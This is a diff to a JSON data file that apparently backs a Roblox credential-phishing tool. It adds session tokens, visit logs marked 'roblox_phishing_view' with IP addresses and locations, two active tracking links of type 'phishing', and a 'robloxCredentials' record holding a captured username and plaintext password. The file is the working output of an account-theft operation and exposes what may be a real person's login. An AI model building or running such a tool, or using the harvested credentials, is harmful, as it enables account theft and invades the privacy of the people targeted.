@@ -32,13 +32,13 @@
       }
     ],
     [
-      "329b256a-e53d-455a-8743-08d409938a16",
+      "0f2de3fa-a7a2-4293-8c0b-21ccab66d777",
       {
         "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
-        "sessionToken": "329b256a-e53d-455a-8743-08d409938a16",
-        "expiresAt": "2025-09-14T21:24:45.422Z",
-        "id": "bf0cf24c-b7f9-4624-9e95-2606314bc856",
-        "createdAt": "2025-09-07T21:24:45.422Z"
+        "sessionToken": "0f2de3fa-a7a2-4293-8c0b-21ccab66d777",
+        "expiresAt": "2025-09-14T21:32:26.126Z",
+        "id": "f73e2516-6f81-4e82-981d-c7f55350a619",
+        "createdAt": "2025-09-07T21:32:26.126Z"
       }
     ]
   ],
@@ -202,6 +202,66 @@
         "deviceBrand": "Apple",
         "timestamp": "2025-09-07T21:24:56.531Z"
       }
+    ],
+    [
+      "046bd704-be76-4b34-b256-11b5377bb92e",
+      {
+        "id": "046bd704-be76-4b34-b256-11b5377bb92e",
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "ipAddress": "72.213.229.99",
+        "userAgent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "referrer": null,
+        "location": "Lyon, France",
+        "status": "roblox_phishing_view",
+        "isVpn": "no",
+        "vpnLocation": null,
+        "realLocation": null,
+        "deviceType": "unknown",
+        "browserName": "Chrome",
+        "operatingSystem": "unknown",
+        "deviceBrand": "Apple",
+        "timestamp": "2025-09-07T21:32:52.869Z"
+      }
+    ],
+    [
+      "b02046e6-e161-44d4-a3b4-1dfca4e066b8",
+      {
+        "id": "b02046e6-e161-44d4-a3b4-1dfca4e066b8",
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "ipAddress": "72.213.229.99",
+        "userAgent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "referrer": null,
+        "location": "Frankfurt, Germany",
+        "status": "roblox_phishing_view",
+        "isVpn": "no",
+        "vpnLocation": null,
+        "realLocation": null,
+        "deviceType": "unknown",
+        "browserName": "Chrome",
+        "operatingSystem": "unknown",
+        "deviceBrand": "Apple",
+        "timestamp": "2025-09-07T21:39:26.035Z"
+      }
+    ],
+    [
+      "71e07a2f-25bd-4a26-a748-3365833ebe9a",
+      {
+        "id": "71e07a2f-25bd-4a26-a748-3365833ebe9a",
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "ipAddress": "72.213.229.99",
+        "userAgent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "referrer": null,
+        "location": "Brisbane, QLD, Australia",
+        "status": "roblox_phishing_view",
+        "isVpn": "no",
+        "vpnLocation": null,
+        "realLocation": null,
+        "deviceType": "unknown",
+        "browserName": "Chrome",
+        "operatingSystem": "unknown",
+        "deviceBrand": "Apple",
+        "timestamp": "2025-09-07T21:40:19.293Z"
+      }
     ]
   ],
   "settings": [
@@ -290,9 +350,54 @@
         "createdAt": "2025-09-07T21:22:53.372Z",
         "updatedAt": "2025-09-07T21:22:53.372Z"
       }
+    ],
+    [
+      "ed295a0a-623d-4d25-a168-e729ffa3df63",
+      {
+        "id": "ed295a0a-623d-4d25-a168-e729ffa3df63",
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "originalUrl": null,
+        "linkType": "phishing",
+        "trackingId": "abd54b69",
+        "title": "TITLE",
+        "clickCount": 2,
+        "isActive": true,
+        "createdAt": "2025-09-07T21:32:44.926Z",
+        "updatedAt": "2025-09-07T21:39:26.051Z"
+      }
+    ],
+    [
+      "6711c1d6-6151-420a-9f77-aae254f6a6a5",
+      {
+        "id": "6711c1d6-6151-420a-9f77-aae254f6a6a5",
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "originalUrl": null,
+        "linkType": "phishing",
+        "trackingId": "64e9f1dd",
+        "title": "TEST",
+        "clickCount": 1,
+        "isActive": true,
+        "createdAt": "2025-09-07T21:40:09.943Z",
+        "updatedAt": "2025-09-07T21:40:19.300Z"
+      }
     ]
   ],
-  "robloxCredentials": [],
-  "timestamp": "2025-09-07T21:27:48.135Z",
+  "robloxCredentials": [
+    [
+      "a51636dd-8331-4c47-9250-a2270d3dd87f",
+      {
+        "id": "a51636dd-8331-4c47-9250-a2270d3dd87f",
+        "userId": "c20c9ff7-22ad-49bc-b8fa-90e48c9b0d94",
+        "linkId": "ed295a0a-623d-4d25-a168-e729ffa3df63",
+        "capturedUsername": "Av121988",
+        "capturedPassword": "Av121988-",
+        "capturedAuthCode": null,
+        "ipAddress": "72.213.229.99",
+        "userAgent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "createdAt": "2025-09-07T21:33:09.060Z"
+      }
+    ]
+  ],
+  "timestamp": "2025-09-07T21:41:32.313Z",
   "version": "2.2"
 }
